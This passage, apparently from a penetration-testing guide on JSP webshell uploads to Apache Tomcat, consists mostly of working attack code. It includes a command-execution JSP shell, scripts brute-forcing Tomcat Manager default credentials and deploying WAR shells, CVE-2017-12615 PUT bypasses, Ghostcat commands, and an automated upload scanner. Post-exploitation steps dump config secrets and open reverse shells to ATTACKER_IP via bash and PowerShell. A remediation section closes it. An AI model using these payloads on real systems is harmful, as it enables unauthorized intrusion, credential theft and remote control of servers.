          mkdir -p /tmp/tm_shell
          cat > /tmp/tm_shell/cmd.jsp << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*"%>
  <%String c=request.getParameter("cmd");if(c!=null){ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",c);pb.redirectErrorStream(true);Process p=pb.start();Scanner sc=new Scanner(p.getInputStream()).useDelimiter("\\A");out.println("<pre>"+(sc.hasNext()?sc.next():"")+"</pre>");}%>
  JSPEOF
          cd /tmp/tm_shell && jar cf /tmp/deploy.war cmd.jsp && cd -

          # Deploy via text manager
          DEPLOY_RESP=$(curl -s "${TARGET}/manager/text/deploy?path=/shell&update=true" \
            -u "$cred" --upload-file /tmp/deploy.war --max-time 15 2>/dev/null)
          echo "[*] Deploy response: ${DEPLOY_RESP}"

          if echo "$DEPLOY_RESP" | grep -qi "OK"; then
              echo "[!!!] WAR deployed successfully!"
              echo "[!!!] Shell: ${TARGET}/shell/cmd.jsp?cmd=id"
              curl -s "${TARGET}/shell/cmd.jsp?cmd=id" | head -5
          fi

          rm -rf /tmp/tm_shell /tmp/deploy.war
          break
      elif [ "$STATUS" = "401" ]; then
          : # Wrong credentials, continue
      fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Tomcat PUT Method (CVE-2017-12615)"}
  ```bash
  # CVE-2017-12615: Tomcat PUT method allows JSP upload
  # Affected: Apache Tomcat 7.0.0 - 7.0.81 (Windows)
  # Also works on misconfigured readonly=false in web.xml

  TARGET="https://target.com"

  echo "═══ CVE-2017-12615 — Tomcat PUT JSP Upload ═══"

  JSP_SHELL='<%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",c);pb.redirectErrorStream(true);Process p=pb.start();Scanner sc=new Scanner(p.getInputStream()).useDelimiter("\\\\A");out.println(sc.hasNext()?sc.next():"");}%>'

  # Method 1: Standard PUT with .jsp
  echo "[*] Testing standard PUT..."
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${TARGET}/shell_put.jsp" \
    -d "${JSP_SHELL}" --max-time 10 2>/dev/null)
  echo "[${STATUS}] PUT /shell_put.jsp"

  # Method 2: PUT with trailing slash (CVE-2017-12615 bypass)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${TARGET}/shell_slash.jsp/" \
    -d "${JSP_SHELL}" --max-time 10 2>/dev/null)
  echo "[${STATUS}] PUT /shell_slash.jsp/"

  # Method 3: PUT with %2f suffix
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${TARGET}/shell_enc.jsp%2f" \
    -d "${JSP_SHELL}" --max-time 10 2>/dev/null)
  echo "[${STATUS}] PUT /shell_enc.jsp%2f"

  # Method 4: PUT with space suffix (Windows)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${TARGET}/shell_space.jsp%20" \
    -d "${JSP_SHELL}" --max-time 10 2>/dev/null)
  echo "[${STATUS}] PUT /shell_space.jsp%20"

  # Method 5: PUT with NTFS ADS (Windows)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${TARGET}/shell_ads.jsp::$DATA" \
    -d "${JSP_SHELL}" --max-time 10 2>/dev/null)
  echo "[${STATUS}] PUT /shell_ads.jsp::\$DATA"

  # Verify any deployed shells
  echo ""
  echo "─── Verification ───"
  for shell in shell_put.jsp shell_slash.jsp shell_enc.jsp shell_space.jsp shell_ads.jsp; do
      RESULT=$(curl -s "${TARGET}/${shell}?cmd=echo+PUT_RCE_CONFIRMED" --max-time 5 2>/dev/null)
      if echo "$RESULT" | grep -q "PUT_RCE_CONFIRMED"; then
          echo "[!!!] RCE: ${TARGET}/${shell}?cmd=COMMAND"
      fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="AJP Ghostcat (CVE-2020-1938)"}
  ```bash
  # CVE-2020-1938: Apache Tomcat AJP Connector vulnerability
  # Allows reading arbitrary files and potential RCE via file inclusion
  # Affected: All Tomcat versions with default AJP config (port 8009)

  TARGET_HOST="target.com"

  echo "═══ CVE-2020-1938 — Ghostcat AJP ═══"

  # Check if AJP port is open
  echo "[*] Checking AJP port 8009..."
  timeout 3 bash -c "echo > /dev/tcp/${TARGET_HOST}/8009" 2>/dev/null && \
      echo "[+] AJP port 8009 is OPEN" || echo "[-] AJP port 8009 closed/filtered"

  # Using pyforkbomb's ajpShooter (or ajpycat)
  # pip3 install ajpycat
  echo ""
  echo "─── Exploitation Tools ───"
  echo "[*] Read web.xml:"
  echo "    python3 ajpShooter.py http://${TARGET_HOST} 8009 /WEB-INF/web.xml read"
  echo ""
  echo "[*] Read application source:"
  echo "    python3 ajpShooter.py http://${TARGET_HOST} 8009 /WEB-INF/classes/config.properties read"
  echo ""
  echo "[*] Include JSP for RCE (if JSP file exists on server):"
  echo "    python3 ajpShooter.py http://${TARGET_HOST} 8009 /path/to/uploaded/shell.txt eval"
  echo ""
  echo "[*] Alternative: use ajp_ghost.py"
  echo "    python3 ajp_ghost.py ${TARGET_HOST} -p 8009 -f /WEB-INF/web.xml"
  ```
  :::
::

---

## Comprehensive Scanner

::code-collapse
```python [jsp_upload_scanner.py]
#!/usr/bin/env python3
"""
JSP Webshell Upload Scanner
Tests JSP/JSPX/WAR upload and Tomcat-specific deployment vectors
"""
import requests
import time
import sys
import os
import zipfile
import io
import urllib3
urllib3.disable_warnings()

class JSPUploadScanner:
    JSP_SHELL = '<%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",c);pb.redirectErrorStream(true);Process p=pb.start();Scanner sc=new Scanner(p.getInputStream()).useDelimiter("\\\\A");out.println(sc.hasNext()?sc.next():"");}else{out.println("JSP_SCANNER_MARKER");}%>'

    JSP_EXTENSIONS = ['jsp', 'jspx', 'jsw', 'jsv', 'jspf', 'jhtml']
    CASE_VARIANTS = ['JSP', 'JsP', 'Jsp', 'jSP', 'jSp', 'JSPX', 'JsPx']
    SAFE_EXTS = ['jpg', 'png', 'gif', 'txt', 'pdf']

    TOMCAT_CREDS = [
        ('tomcat', 'tomcat'), ('admin', 'admin'), ('manager', 'manager'),
        ('tomcat', 's3cret'), ('admin', 'password'), ('root', 'root'),
        ('both', 'tomcat'), ('tomcat', 'changethis'), ('admin', 'admin123'),
        ('deployer', 'deployer'), ('tomcat', 'password'),
    ]

    MAGIC = {
        'jpeg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
        'png': b'\x89PNG\r\n\x1a\n',
        'gif': b'GIF89a',
    }

    def __init__(self, upload_url=None, target=None, field="file", cookies=None):
        self.upload_url = upload_url
        self.target = target or (upload_url.rsplit('/', 2)[0] if upload_url else None)
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        if cookies:
            self.session.cookies.update(cookies)
        self.results = {'accepted': [], 'rce': [], 'manager': None}

    def upload(self, content, filename, ct='image/jpeg'):
        if not self.upload_url:
            return False, 0
        files = {self.field: (filename, content.encode() if isinstance(content, str) else content, ct)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=20)
            ok = r.status_code in [200, 201] and any(
                w in r.text.lower() for w in ['success', 'upload', 'saved', 'url', 'path', 'file']
            ) and not any(
                w in r.text.lower() for w in ['error', 'invalid', 'denied', 'blocked', 'forbidden']
            )
            return ok, r.status_code
        except:
            return False, 0

    def verify_shell(self, filename, dirs=None):
        if dirs is None:
            dirs = ['uploads', 'files', 'media', 'images', 'static', 'content', '']
        for d in dirs:
            url = f"{self.target}/{d}/{filename}" if d else f"{self.target}/{filename}"
            try:
                r = self.session.get(url, params={'cmd': 'echo JSP_RCE_CONFIRMED'}, timeout=5)
                if 'JSP_RCE_CONFIRMED' in r.text or 'JSP_SCANNER_MARKER' in r.text:
                    return url
            except:
                pass
        return None

    def create_war(self, jsp_content):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w') as zf:
            zf.writestr('cmd.jsp', jsp_content)
            zf.writestr('WEB-INF/web.xml', '<?xml version="1.0"?><web-app/>')
        buf.seek(0)
        return buf.read()

    def test_manager(self):
        if not self.target:
            return
        print("\n[*] Phase: Tomcat Manager Brute Force")
        war_data = self.create_war(self.JSP_SHELL)

        for user, passwd in self.TOMCAT_CREDS:
            try:
                r = self.session.put(
                    f"{self.target}/manager/text/deploy?path=/scanner_test&update=true",
                    auth=(user, passwd), data=war_data,
                    headers={'Content-Type': 'application/octet-stream'}, timeout=10
                )
                if r.status_code == 200 and 'OK' in r.text:
                    self.results['manager'] = f'{user}:{passwd}'
                    print(f"  [!!!] Manager creds: {user}:{passwd}")
                    print(f"        Shell: {self.target}/scanner_test/cmd.jsp?cmd=id")
                    self.results['rce'].append(f'Manager deploy ({user}:{passwd})')
                    return True
            except:
                pass
        print("  [-] No valid manager credentials found")
        return False

    def test_put(self):
        if not self.target:
            return
        print("\n[*] Phase: PUT Method Upload")
        for suffix in ['', '/', '%20', '%2f', '::$DATA']:
            try:
                url = f"{self.target}/scanner_put.jsp{suffix}"
                r = self.session.put(url, data=self.JSP_SHELL, timeout=10)
                if r.status_code in [200, 201, 204]:
                    print(f"  [+] PUT accepted: {url}")
                    shell = self.verify_shell('scanner_put.jsp', [''])
                    if shell:
                        print(f"  [!!!] PUT RCE: {shell}")
                        self.results['rce'].append(f'PUT {suffix}')
            except:
                pass

    def scan(self, delay=0.3):
        print(f"\n{'='*60}")
        print(f" JSP Upload Scanner")
        print(f"{'='*60}")
        if self.upload_url:
            print(f"[*] Upload: {self.upload_url}")
        if self.target:
            print(f"[*] Target: {self.target}")
        print("-" * 60)

        if self.upload_url:
            # Direct extensions
            print("\n[*] Phase: Direct JSP Extensions")
            for ext in self.JSP_EXTENSIONS:
                ok, status = self.upload(self.JSP_SHELL, f'shell.{ext}')
                if ok:
                    self.results['accepted'].append(f'.{ext}')
                    print(f"  [+] .{ext} ACCEPTED")
                time.sleep(delay)

            # Case variations
            print("\n[*] Phase: Case Variations")
            for ext in self.CASE_VARIANTS:
                ok, status = self.upload(self.JSP_SHELL, f'shell.{ext}')
                if ok:
                    self.results['accepted'].append(f'.{ext}')
                    print(f"  [+] .{ext} ACCEPTED")
                time.sleep(delay)

            # Double extensions
            print("\n[*] Phase: Double Extensions")
            for jsp_ext in ['jsp', 'jspx', 'jspf']:
                for safe_ext in self.SAFE_EXTS:
                    for pattern in [f'{jsp_ext}.{safe_ext}', f'{safe_ext}.{jsp_ext}']:
                        ok, status = self.upload(self.JSP_SHELL, f'shell.{pattern}')
                        if ok:
                            self.results['accepted'].append(f'.{pattern}')
                            print(f"  [+] .{pattern} ACCEPTED")
                        time.sleep(delay)

            # Magic bytes
            print("\n[*] Phase: Magic Bytes + JSP")
            for magic_name, magic_bytes in self.MAGIC.items():
                content = magic_bytes + self.JSP_SHELL.encode()
                for ext in ['jsp', 'jspx', 'jspf']:
                    ok, status = self.upload(content, f'avatar.{ext}', f'image/{magic_name}')
                    if ok:
                        self.results['accepted'].append(f'{magic_name}+.{ext}')
                        print(f"  [+] {magic_name} magic + .{ext} ACCEPTED")
                    time.sleep(delay)

            # WAR upload
            print("\n[*] Phase: WAR Upload")
            war_data = self.create_war(self.JSP_SHELL)
            for ext in ['war', 'WAR', 'War']:
                ok, status = self.upload(war_data, f'app.{ext}', 'application/java-archive')
                if ok:
                    self.results['accepted'].append(f'.{ext}')
                    print(f"  [+] .{ext} WAR ACCEPTED")
                time.sleep(delay)

        # Tomcat manager
        self.test_manager()

        # PUT method
        self.test_put()

        # Summary
        print(f"\n{'='*60}")
        print(f" RESULTS")
        print(f"{'='*60}")
        print(f"Accepted uploads: {len(self.results['accepted'])}")
        print(f"RCE confirmed:    {len(self.results['rce'])}")
        print(f"Manager access:   {self.results['manager'] or 'No'}")

        if self.results['accepted']:
            print(f"\n[+] Accepted vectors:")
            for r in self.results['accepted']:
                print(f"    {r}")

        if self.results['rce']:
            print(f"\n[!!!] Confirmed RCE:")
            for r in self.results['rce']:
                print(f"    ★ {r}")

        return self.results


if __name__ == "__main__":
    scanner = JSPUploadScanner(
        upload_url="https://target.com/api/upload",
        target="https://target.com",
        field="file",
        cookies={"JSESSIONID": "SESSION_VALUE"},
    )
    scanner.scan(delay=0.3)
```
::

---

## Verification & Post-Exploitation

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Shell Discovery & Verification"}
  ```bash
  TARGET="https://target.com"
  MARKER="JSP_RCE_$(date +%s)"

  echo "═══ JSP Shell Verification ═══"

  # Search common paths
  for dir in uploads files media images content static webapps ROOT "" \
             pwned shell app deploy scanner_test; do
      for f in shell.jsp shell.jspx cmd.jsp shell.jspf shell.jsw \
               shell.jsp.jpg avatar.jsp shell_put.jsp; do
          URL="${TARGET}/${dir}/${f}"
          [ -z "$dir" ] && URL="${TARGET}/${f}"
          RESULT=$(curl -s --max-time 3 "${URL}?cmd=echo+${MARKER}" 2>/dev/null)
          if echo "$RESULT" | grep -q "$MARKER"; then
              echo "[!!!] RCE CONFIRMED: ${URL}"
              echo "[*] System info:"
              curl -s "${URL}?cmd=id" | head -1
              curl -s "${URL}?cmd=hostname" | head -1
              curl -s "${URL}?cmd=uname+-a" | head -1
              break 2
          fi
      done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Linux Post-Exploitation"}
  ```bash
  S="https://target.com/uploads/shell.jsp"

  # System enumeration
  curl -s "$S?cmd=id;hostname;uname+-a"
  curl -s "$S" --data-urlencode "cmd=cat /etc/os-release"

  # Java environment
  curl -s "$S" --data-urlencode "cmd=java -version 2>&1"
  curl -s "$S" --data-urlencode "cmd=find / -name 'server.xml' 2>/dev/null | head -5"
  curl -s "$S" --data-urlencode "cmd=cat \$CATALINA_HOME/conf/tomcat-users.xml 2>/dev/null"
  curl -s "$S" --data-urlencode "cmd=cat \$CATALINA_HOME/conf/server.xml 2>/dev/null"

  # Application secrets
  curl -s "$S" --data-urlencode "cmd=find / -name 'application.properties' -o -name 'application.yml' -o -name '.env' 2>/dev/null | head -10"
  curl -s "$S" --data-urlencode "cmd=find / -name 'web.xml' 2>/dev/null | head -10"
  curl -s "$S" --data-urlencode "cmd=env | grep -iE 'key|secret|pass|token|database|jdbc|url'"

  # Network
  curl -s "$S" --data-urlencode "cmd=ip addr; echo ---; ss -tlnp; echo ---; cat /etc/hosts"

  # Reverse shell upgrade (listener: nc -lvnp 4444)
  curl -s "$S" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Windows Post-Exploitation"}
  ```bash
  S="https://target.com/uploads/shell.jsp"

  curl -s "$S?cmd=whoami"
  curl -s "$S" --data-urlencode "cmd=systeminfo"
  curl -s "$S" --data-urlencode "cmd=ipconfig /all"
  curl -s "$S" --data-urlencode "cmd=net user"
  curl -s "$S" --data-urlencode "cmd=net localgroup administrators"

  # Java/Tomcat specifics on Windows
  curl -s "$S" --data-urlencode 'cmd=type "%CATALINA_HOME%\conf\tomcat-users.xml"'
  curl -s "$S" --data-urlencode 'cmd=type "%CATALINA_HOME%\conf\server.xml"'
  curl -s "$S" --data-urlencode "cmd=dir /s /b C:\\*.properties C:\\*.yml 2>nul | findstr -i application"

  # PowerShell reverse shell
  curl -s "$S" --data-urlencode "cmd=powershell -NoP -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/rev.ps1')\""
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Safe PoC"}
  ```bash
  TS=$(date +%s)

  cat > poc_${TS}.jsp << POCEOF
  <%@ page import="java.util.*" %>
  <%
  out.println("JSP_UPLOAD_POC_${TS}");
  out.println("OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version"));
  out.println("Java: " + System.getProperty("java.version"));
  out.println("User: " + System.getProperty("user.name"));
  out.println("Server: " + application.getServerInfo());
  out.println("Path: " + application.getRealPath("/"));
  out.println("Time: " + new java.util.Date());
  %>
  POCEOF

  curl -X POST "https://target.com/api/upload" \
    -F "file=@poc_${TS}.jsp;filename=poc_${TS}.jspx;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  curl -s "https://target.com/uploads/poc_${TS}.jspx"

  echo ""
  echo "═══ Report ═══"
  echo "Title: Remote Code Execution via JSP Webshell Upload"
  echo "Severity: Critical (CVSS 9.8)"
  echo "Endpoint: POST /api/upload"
  echo "Bypass: .jspx extension not blocked"
  echo "PoC: ${TS}"
  ```
  :::
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: JSP Upload → Direct RCE
  ---
  1. Application accepts `.jspx` (blacklist misses it)
  2. Upload JSP shell with `.jspx` extension
  3. Tomcat compiles and executes the JSPX servlet
  4. `?cmd=id` returns OS command output
  5. Full RCE as Tomcat user
  :::

  :::card
  ---
  icon: i-lucide-link
  title: WAR Upload → Auto-Deploy → RCE
  ---
  1. Application accepts `.war` archives
  2. Upload WAR containing JSP webshell
  3. Tomcat auto-deploys WAR in `webapps/` directory
  4. New context created at `/appname/`
  5. Access `cmd.jsp` in deployed application → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Tomcat Manager → WAR Deploy → RCE
  ---
  1. Discover Tomcat Manager at `/manager/html`
  2. Brute-force default credentials (`tomcat:tomcat`, etc.)
  3. Deploy WAR via Manager's text interface
  4. WAR contains JSP webshell
  5. Access deployed shell → persistent RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: PUT Method (CVE-2017-12615) → JSP Write → RCE
  ---
  1. Tomcat 7 with default `readonly=false` or Windows path handling
  2. HTTP PUT request writes `.jsp` file directly to webroot
  3. `PUT /shell.jsp/ HTTP/1.1` bypasses extension restriction
  4. JSP file created on disk
  5. Access shell → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: AJP Ghostcat (CVE-2020-1938) → File Read → RCE
  ---
  1. AJP connector on port 8009 (default, unauthenticated)
  2. Read `/WEB-INF/web.xml`, `application.properties` via AJP
  3. Extract database credentials, API keys, internal paths
  4. If file include mode: include uploaded text file as JSP
  5. File interpreted as JSP → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Deserialization → Arbitrary File Write → JSP Shell
  ---
  1. Java deserialization vulnerability in upload processing
  2. Craft gadget chain that writes file to disk
  3. Write JSP webshell to Tomcat webapps directory
  4. Access the written JSP file
  5. RCE via deserialization chain + file write
  :::
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`Remote Code Execution via JSP Webshell Upload [/ Tomcat Manager / WAR Deployment / PUT Method] at [Endpoint]`

#### Root Cause
The application allows uploading files with Java Server Pages extensions (`.jsp`, `.jspx`, `.jspf`) which are compiled and executed by the Tomcat/Java application server. The upload validation uses a blacklist that does not include all executable Java extensions. [OR: Tomcat Manager is accessible with default credentials. OR: HTTP PUT method allows direct JSP file creation.]

#### Reproduction
```bash
# Create JSP webshell
echo '<%@ page import="java.util.*,java.io.*"%><%out.println(System.getProperty("os.name"));%>' > poc.jspx

# Upload
curl -X POST "https://target.com/api/upload" \
  -F "file=@poc.jspx;type=image/jpeg" -H "Cookie: session=TOKEN"

# Verify
curl "https://target.com/uploads/poc.jspx"
```

#### Impact
An attacker can execute arbitrary operating system commands on the Java application server. On Tomcat, this runs as the `tomcat` user with access to all deployed application data, database connection strings in `context.xml`/`server.xml`, and potentially the ability to deploy additional applications.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Whitelist Extensions
  ---
  Allow only known-safe extensions (`.jpg`, `.png`, `.gif`, `.pdf`). Block ALL Java-executable extensions: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.jhtml`, `.war`, `.jar`, `.class`. Use case-insensitive comparison.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Secure Tomcat Manager
  ---
  Change default Tomcat Manager credentials immediately. Restrict Manager access to localhost only via `RemoteAddrValve`. Consider disabling Manager entirely in production. Remove default applications (`/examples`, `/docs`, `/host-manager`).
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable PUT & DELETE
  ---
  Set `readonly="true"` (default) in Tomcat's `web.xml` DefaultServlet configuration. Disable WebDAV. Remove any custom PUT handlers that write files.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Secure AJP Connector
  ---
  Disable AJP if not needed. If required, set `secretRequired="true"` and configure a strong secret. Bind AJP to localhost only. Upgrade to Tomcat versions patched for CVE-2020-1938.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Store Uploads Outside Webroot
  ---
  Save uploaded files outside the Tomcat `webapps/` directory. Serve them through a proxy servlet that sets `Content-Disposition: attachment`. Never allow uploaded files to be compiled by the JSP engine.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Random Filenames
  ---
  Generate server-side filenames: `UUID.randomUUID() + ".jpg"`. Never preserve user-supplied filenames. This prevents all extension-based attacks.
  :::
::

---

## References & Learning Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: Apache Tomcat Security
  to: https://tomcat.apache.org/security.html
  target: _blank
  ---
  Official Tomcat security advisories covering CVE-2017-12615, CVE-2020-1938, and all historical vulnerabilities.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — Tomcat Pentesting
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat.html
  target: _blank
  ---
  Comprehensive Tomcat exploitation guide covering Manager brute force, WAR deployment, AJP Ghostcat, PUT upload, and JSP webshells.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — JSP Webshells
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community-maintained JSP webshell collection with obfuscated variants, reverse shells, and WAR deployment payloads.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP guide covering file upload attacks including JSP-specific exploitation techniques and defense strategies.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Labs
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive labs covering file upload bypasses including Java/JSP-specific scenarios with step-by-step solutions.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CVE-2020-1938 — Ghostcat
  to: https://www.chaitin.cn/en/ghostcat
  target: _blank
  ---
  Original Ghostcat research paper explaining the AJP connector vulnerability, exploitation, and remediation for Apache Tomcat.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — JSP/Tomcat Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=tomcat%20jsp%20upload
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating JSP upload attacks, Tomcat Manager exploitation, and WAR deployment on production systems.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Tomcat Manager Documentation
  to: https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html
  target: _blank
  ---
  Official Tomcat Manager documentation — understanding the deployment API is essential for exploiting Manager access.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: tennc/webshell — JSP Collection
  to: https://github.com/tennc/webshell/tree/master/jsp
  target: _blank
  ---
  Curated collection of JSP webshells with various features including file managers, database tools, and reverse shells.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Msfvenom JSP Payloads
  to: https://www.offensive-security.com/metasploit-unleashed/msfvenom/
  target: _blank
  ---
  Metasploit's msfvenom can generate JSP/WAR reverse shell payloads: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war`
  :::
::